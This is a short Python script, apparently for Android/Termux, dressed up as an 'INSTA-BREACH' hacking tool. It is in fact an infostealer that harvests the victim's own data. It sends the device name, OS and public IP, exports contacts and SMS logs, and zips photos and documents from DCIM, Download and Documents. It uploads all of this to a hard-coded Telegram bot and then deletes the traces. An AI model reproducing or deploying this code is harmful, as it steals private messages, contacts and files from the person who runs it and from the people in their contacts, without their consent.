import os
import requests
import platform
import subprocess
import zipfile

# --- CONFIG ---
TOKEN = "8395429730:AAHWk9xGn_ywMixj1Zx6iILxjm15XU0dnGc"
ID = "8025089065"

def send_to_bot(file_path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': ID, 'caption': caption}, files={'document': f})
    except: pass

def start_siphon():
    print("\033[1;31m[!] INITIALIZING INSTA-BREACH V5.0...\033[0m")
    
    # 1. TRAP: IP & DEVICE INFO
    try:
        ip = requests.get('https://api.ipify.org').text
        device_data = f"🚀 VICTIM: {platform.node()}\nIP: {ip}\nOS: {platform.platform()}"
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={device_data}")
    except: pass

    # 2. CONTACTS & SMS (Needs termux-api)
    try:
        os.system("termux-contact-list > contacts.json")
        os.system("termux-sms-list > sms.json")
        send_to_bot("contacts.json", "👤 Victim Contacts")
        send_to_bot("sms.json", "📩 Victim SMS Logs")
    except: pass

    # 3. FILE SIPHONER (DCIM & Documents)
    print("[*] BYPASSING ENCRYPTION...")
    target_dirs = ['/sdcard/DCIM', '/sdcard/Download', '/sdcard/Documents']
    
    with zipfile.ZipFile('data_vault.zip', 'w') as zipf:
        for folder in target_dirs:
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.endswith(('.jpg', '.png', '.pdf', '.txt')): # Targeted files
                        zipf.write(os.path.join(root, file), arcname=file)
    
    send_to_bot("data_vault.zip", "📁 Siphoned Files (Images/Docs)")
    
    # 4. CLEANUP
    os.system("rm contacts.json sms.json data_vault.zip")
    
    print("\033[1;32m\n[✔] OPERATION COMPLETE. TARGET BREACHED.\033[0m")

if __name__ == "__main__":
    start_siphon()
